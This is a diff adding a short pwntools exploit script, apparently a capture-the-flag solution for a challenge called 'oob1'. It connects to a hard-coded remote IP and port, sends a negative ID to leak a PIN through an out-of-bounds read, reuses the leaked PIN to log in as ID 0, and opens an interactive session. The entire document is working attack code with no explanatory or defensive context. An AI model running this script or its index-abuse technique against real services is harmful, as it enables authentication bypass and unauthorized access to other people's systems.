@@ -1,0 +1,15 @@
+from pwn import *
+
+r = remote('140.110.112.77', 3111)
+#r = process('oob1')
+r.recvuntil('ID: ')
+r.sendline('-4')
+r.recvuntil('PIN: ')
+r.sendline(str(10))
+pincode = u32(r.recvline().strip().split('[')[1].split(']')[0][:4])
+print(hex(pincode))
+r.recvuntil('ID: ')
+r.sendline('0')
+r.recvuntil('PIN: ')
+r.sendline(str(pincode))
+r.interactive()
